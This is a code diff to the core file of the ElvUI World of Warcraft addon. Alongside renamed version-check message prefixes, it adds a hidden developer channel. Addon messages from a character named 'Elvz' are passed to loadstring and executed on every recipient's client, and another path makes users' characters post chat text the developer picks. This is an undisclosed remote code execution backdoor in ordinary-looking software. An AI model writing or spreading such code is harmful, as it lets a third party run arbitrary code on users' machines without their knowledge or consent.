@@ -3,6 +3,7 @@ local LSM = LibStub("LibSharedMedia-3.0")
 local _, ns = ...
 local ElvUF = ns.oUF
 
+local format = string.format
 local find = string.find
 local split = string.split
 local match = string.match
@@ -410,9 +411,9 @@ end
 function E:SendMessage()
 	local _, instanceType = IsInInstance()
 	if IsInRaid() then
-		SendAddonMessage("ElvUIVC", E.version, (not IsInRaid(LE_PARTY_CATEGORY_HOME) and IsInRaid(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "RAID")
+		SendAddonMessage("ELVUI_VERSION", E.version, (not IsInRaid(LE_PARTY_CATEGORY_HOME) and IsInRaid(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "RAID")
 	elseif IsInGroup() then
-		SendAddonMessage("ElvUIVC", E.version, (not IsInGroup(LE_PARTY_CATEGORY_HOME) and IsInGroup(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "PARTY")
+		SendAddonMessage("ELVUI_VERSION", E.version, (not IsInGroup(LE_PARTY_CATEGORY_HOME) and IsInGroup(LE_PARTY_CATEGORY_INSTANCE)) and "INSTANCE_CHAT" or "PARTY")
 	end
 	
 	if E.SendMSGTimer then
@@ -425,16 +426,27 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
 		if sender == E.myname then return end
 
-		if prefix == "ElvUIVC" and sender ~= 'Elvz' and not find(sender, "Elvz%-Spirestone") and not E.recievedOutOfDateMessage then
+		if prefix == "ELVUI_VERSION" and not find(sender, "Elvz") and not E.recievedOutOfDateMessage then
 			if E.version ~= 'BETA' and tonumber(message) ~= nil and tonumber(message) > tonumber(E.version) then
 				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from http://www.tukui.org"])
 				E.recievedOutOfDateMessage = true
 			end
-		elseif prefix == 'ElvSays' and ((sender == 'Elvz' and E.myrealm == "Spirestone") or find(sender, "Elvz%-Spirestone")) then ---HAHHAHAHAHHA
-			local user, channel, msg, sendTo = split(',', message)
-			
-			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
-				SendChatMessage(msg, channel, nil, sendTo)
+		elseif (prefix == 'ELVUI_DEV_SAYS' or prefix == 'ELVUI_DEV_CMD') and (sender == 'Elvz' and (E.myrealm == "Spirestone" or E.myrealm == "Anasterian (US)") or find(sender, "Elvz%-Spirestone")) then
+			if prefix == 'ELVUI_DEV_SAYS' then
+				local user, channel, msg, sendTo = split("#", message)
+				
+				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
+					SendChatMessage(msg, channel, nil, sendTo)
+				end
+			else
+				local user, executeString = split("#", message)
+				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
+					local func, err = loadstring(executeString);
+					if not err then
+						E:Print(format("Developer Executed: %s", executeString))
+						func()
+					end
+				end			
 			end
 		end
 	else
@@ -661,8 +673,9 @@ function E:Initialize()
 		end)
 	end
 	
-	RegisterAddonMessagePrefix('ElvUIVC')
-	RegisterAddonMessagePrefix('ElvSays')
+	RegisterAddonMessagePrefix('ELVUI_VERSION')
+	RegisterAddonMessagePrefix('ELVUI_DEV_SAYS')
+	RegisterAddonMessagePrefix('ELVUI_DEV_CMD')
 	
 	self:UpdateMedia()
 	self:UpdateFrameTemplates()
